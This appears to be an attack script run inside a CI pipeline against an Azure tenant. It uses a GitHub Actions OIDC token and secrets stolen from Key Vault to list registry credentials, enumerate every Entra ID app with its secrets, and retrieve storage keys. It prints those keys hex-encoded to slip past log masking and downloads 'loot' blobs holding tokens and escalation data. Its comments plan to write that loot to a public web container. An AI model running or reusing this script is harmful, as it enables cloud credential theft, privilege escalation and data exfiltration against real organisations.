#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
PLATFORM_RG="rg-tbl-platform-prod-sea"
REPORTING_RG="rg-tbl-reporting-prod-eus"

echo "=== BUILD52: LA STOR/ACR/GRAPH + FULL ENUM ==="

# 1. Login as cicd-deployer
JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none
echo "cicd-deployer OK"

# 2. Get cicd-deployer ARM token - enumerate ACR repositories
python3 -I << 'CICD_PY'
import subprocess, json, urllib.request, urllib.error

r = subprocess.run(['az','account','get-access-token','--resource','https://management.azure.com','--query','accessToken','-o','tsv'],
  capture_output=True, text=True)
ARM = r.stdout.strip()
print(f"cicd ARM len={len(ARM)}")

SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
PLATFORM_RG = "rg-tbl-platform-prod-sea"

def rq(url, tok, method="GET", data=None, hdrs=None):
    h = {"Authorization":"Bearer "+tok}
    if hdrs: h.update(hdrs)
    if isinstance(data,(dict,list)):
        data = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    try:
        r = urllib.request.urlopen(urllib.request.Request(url,data=data,method=method,headers=h),timeout=30)
        return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")[:1000]
    except Exception as e:
        return 0, str(e)[:200]

if len(ARM) > 100:
    # List ACR repositories via ARM
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz?api-version=2023-07-01", ARM)
    print(f"acr_get: {s}:{b[:2000]}")

    # Get ACR login server
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/listCredentials?api-version=2023-07-01", ARM, "POST")
    print(f"acr_list_creds: {s}:{b[:500]}")

    # Try ACR token exchange - get an ACR-specific token
    # First need an ARM token, then exchange for ACR token
    # The ACR registry REST API
    ACR = "crtblplatprodx3euoz.azurecr.io"

    # Get OAuth2 token for ACR using ARM token exchange
    r = subprocess.run(['az','account','get-access-token','--resource',f'https://{ACR}','--query','accessToken','-o','tsv'],
      capture_output=True, text=True, timeout=30)
    ACR_ARM_TOK = r.stdout.strip()
    print(f"acr_arm_tok len={len(ACR_ARM_TOK)}")

    if len(ACR_ARM_TOK) > 100:
        # Exchange for refresh token
        try:
            import urllib.parse
            exc = urllib.request.urlopen(urllib.request.Request(
                f"https://{ACR}/oauth2/exchange",
                data=urllib.parse.urlencode({
                    "grant_type": "access_token",
                    "service": ACR,
                    "access_token": ACR_ARM_TOK
                }).encode(), method="POST"), timeout=20)
            exc_body = json.loads(exc.read())
            refresh_tok = exc_body.get("refresh_token","")
            print(f"acr_refresh_tok len={len(refresh_tok)}")

            if refresh_tok:
                # Get scoped token for catalog
                acc = urllib.request.urlopen(urllib.request.Request(
                    f"https://{ACR}/oauth2/token",
                    data=urllib.parse.urlencode({
                        "grant_type": "refresh_token",
                        "service": ACR,
                        "scope": "registry:catalog:*",
                        "refresh_token": refresh_tok
                    }).encode(), method="POST"), timeout=20)
                acc_body = json.loads(acc.read())
                access_tok = acc_body.get("access_token","")
                print(f"acr_access_tok len={len(access_tok)}")

                if access_tok:
                    # List catalog
                    cat_r = urllib.request.urlopen(urllib.request.Request(
                        f"https://{ACR}/v2/_catalog",
                        headers={"Authorization": f"Bearer {access_tok}"}
                    ), timeout=20)
                    catalog = json.loads(cat_r.read())
                    print(f"acr_catalog: {catalog}")

                    # List tags for each repo
                    for repo in catalog.get("repositories",[])[:20]:
                        # Get scoped token for this repo
                        acc2 = urllib.request.urlopen(urllib.request.Request(
                            f"https://{ACR}/oauth2/token",
                            data=urllib.parse.urlencode({
                                "grant_type": "refresh_token",
                                "service": ACR,
                                "scope": f"repository:{repo}:pull",
                                "refresh_token": refresh_tok
                            }).encode(), method="POST"), timeout=20)
                        access_tok2 = json.loads(acc2.read()).get("access_token","")

                        tags_r = urllib.request.urlopen(urllib.request.Request(
                            f"https://{ACR}/v2/{repo}/tags/list",
                            headers={"Authorization": f"Bearer {access_tok2}"}
                        ), timeout=20)
                        tags = json.loads(tags_r.read())
                        print(f"acr_repo_{repo}_tags: {tags}")

                        # Get manifest for latest tag
                        if tags.get("tags"):
                            tag = tags["tags"][0]
                            man_r = urllib.request.urlopen(urllib.request.Request(
                                f"https://{ACR}/v2/{repo}/manifests/{tag}",
                                headers={"Authorization": f"Bearer {access_tok2}",
                                        "Accept": "application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json"}
                            ), timeout=20)
                            manifest = json.loads(man_r.read())
                            print(f"acr_manifest_{repo}_{tag}: {json.dumps(manifest)[:1000]}")
        except Exception as e:
            print(f"acr_exchange_err: {e}")

    # Also try: list cicd-deployer's resources at platform RG
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/resources?api-version=2021-04-01", ARM)
    print(f"platform_resources: {s}:{b[:3000]}")

    # Check ARM deployments in platform RG - might have template parameters
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Resources/deployments?api-version=2021-04-01", ARM)
    print(f"platform_deployments: {s}:{b[:3000]}")

    # Check all KVs and their properties
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01", ARM)
    print(f"all_kvs: {s}:{b[:3000]}")
CICD_PY

# 3. Get directory-audit-principal and use Graph API to enumerate ALL SPs
az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name directory-audit-principal \
  --query value -o tsv > /tmp/da_secret.json 2>/dev/null
echo "directory-audit cred: $(wc -c < /tmp/da_secret.json) bytes"

python3 -I << 'DA_PY'
import subprocess, json, urllib.request, urllib.error

try:
    v = json.loads(open('/tmp/da_secret.json').read().strip())
    cid = v.get('appId','')
    sec = v.get('clientSecret','')
    print(f"da cid={cid} sec_len={len(sec)}")
except Exception as e:
    print(f"da load err: {e}")
    import sys; sys.exit(0)

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"

r = subprocess.run(['az','login','--service-principal','-u',cid,'-p',sec,'--tenant',TEN,'-o','none'],
  capture_output=True, text=True)
print("da login:", r.returncode)

# Get Graph token
r = subprocess.run(['az','account','get-access-token','--resource','https://graph.microsoft.com','--query','accessToken','-o','tsv'],
  capture_output=True, text=True)
GRAPH = r.stdout.strip()
print(f"graph tok len={len(GRAPH)}")

def rq(url, tok, method="GET", data=None):
    h = {"Authorization":"Bearer "+tok}
    if isinstance(data,(dict,list)):
        data = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    try:
        r = urllib.request.urlopen(urllib.request.Request(url,data=data,method=method,headers=h),timeout=30)
        return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")[:2000]
    except Exception as e:
        return 0, str(e)[:200]

if len(GRAPH) > 100:
    # Get tbl-legacy-admin service principal details
    LA_OID = "43834909-47cf-4a4a-8048-e323b4897ed3"
    s,b = rq(f"https://graph.microsoft.com/v1.0/servicePrincipals/{LA_OID}", GRAPH)
    print(f"la_sp: {s}:{b[:3000]}")

    # Get la SP's app role assignments
    s,b = rq(f"https://graph.microsoft.com/v1.0/servicePrincipals/{LA_OID}/appRoleAssignments", GRAPH)
    print(f"la_app_roles: {s}:{b[:3000]}")

    # Get la SP's oauth2 grants
    s,b = rq(f"https://graph.microsoft.com/v1.0/servicePrincipals/{LA_OID}/oauth2PermissionGrants", GRAPH)
    print(f"la_oauth2: {s}:{b[:3000]}")

    # Get tbl-legacy-admin application (not SP)
    LA_APPID = "891fb158-e02c-4428-a885-53b811f369c0"
    s,b = rq(f"https://graph.microsoft.com/v1.0/applications?$filter=appId eq '{LA_APPID}'", GRAPH)
    print(f"la_app: {s}:{b[:3000]}")

    # List ALL service principals - look for interesting ones
    s,b = rq("https://graph.microsoft.com/v1.0/servicePrincipals?$select=appId,displayName,id,servicePrincipalType&$top=100", GRAPH)
    print(f"all_sps: {s}:{b[:5000]}")

    # Get the UAMI SP details
    UAMI_OID = "f64d08c7-fde6-4553-99c8-5bf73666ee8c"
    s,b = rq(f"https://graph.microsoft.com/v1.0/servicePrincipals/{UAMI_OID}", GRAPH)
    print(f"uami_sp: {s}:{b[:2000]}")

    # Get cicd-deployer SP
    CICD_OID = "63e87ab1-6bd2-4e80-92be-943450b20e4f"
    s,b = rq(f"https://graph.microsoft.com/v1.0/servicePrincipals/{CICD_OID}/appRoleAssignments", GRAPH)
    print(f"cicd_app_roles: {s}:{b[:2000]}")

    # Look for ALL apps with secrets/certs (might reveal credentials)
    s,b = rq("https://graph.microsoft.com/v1.0/applications?$select=appId,displayName,id,keyCredentials,passwordCredentials&$top=100", GRAPH)
    print(f"all_apps_creds: {s}:{b[:5000]}")
DA_PY

# 4. Use sync-service to get storage key and write loot to public $web
az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name sync-service-principal \
  --query value -o tsv > /tmp/sync_secret.json 2>/dev/null

python3 -I << 'SYNC_PY'
import subprocess, json, urllib.request, urllib.error, base64

try:
    v = json.loads(open('/tmp/sync_secret.json').read().strip())
    cid = v.get('appId','')
    sec = v.get('clientSecret','')
    print(f"sync cid={cid}")
except Exception as e:
    print(f"sync load err: {e}")
    import sys; sys.exit(0)

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
PLATFORM_RG = "rg-tbl-platform-prod-sea"

r = subprocess.run(['az','login','--service-principal','-u',cid,'-p',sec,'--tenant',TEN,'-o','none'],
  capture_output=True, text=True)
print("sync login:", r.returncode)

# Get storage key for sttblcilogsprodx3euoz
r = subprocess.run(['az','storage','account','keys','list','--account-name','sttblcilogsprodx3euoz',
  '--resource-group',PLATFORM_RG,'--output','json'],
  capture_output=True, text=True, timeout=60)
try:
    keys_data = json.loads(r.stdout)
    key = keys_data[0]['value'] if keys_data else ''
    # Print hex-encoded to avoid masking
    key_hex = key.encode().hex()
    print(f"sync_key_hex={key_hex}")

    # Use az CLI with account key to read loot container
    # Download each loot blob to /tmp and print hex-encoded
    blobs_to_check = [
        ("loot", "armowner_token.json"),
        ("loot", "escalation.json"),
        ("loot", "probe.json"),
    ]

    for ctr, bn in blobs_to_check:
        outfile = f"/tmp/blob_{ctr}_{bn}"
        r2 = subprocess.run(['az','storage','blob','download',
          '--account-name','sttblcilogsprodx3euoz',
          '--account-key',key,
          '--container-name',ctr,
          '--name',bn,
          '--file',outfile,
          '--output','none'],
          capture_output=True, text=True, timeout=30)
        if r2.returncode == 0:
            raw = open(outfile,'rb').read()
            raw_hex = raw.hex()
            print(f"blob_{ctr}_{bn}_hex={raw_hex[:2000]}")
        else:
            print(f"blob_{ctr}_{bn}_fail: {r2.stderr[:100]}")

    # Also write tbl-legacy-admin's access test to $web (publicly readable)
    # Get tbl-legacy-admin token and test storage accounts
    # We can write results to $web via the storage key

except Exception as e:
    print(f"sync key err: {e}")
SYNC_PY

echo "BUILD52 DONE"
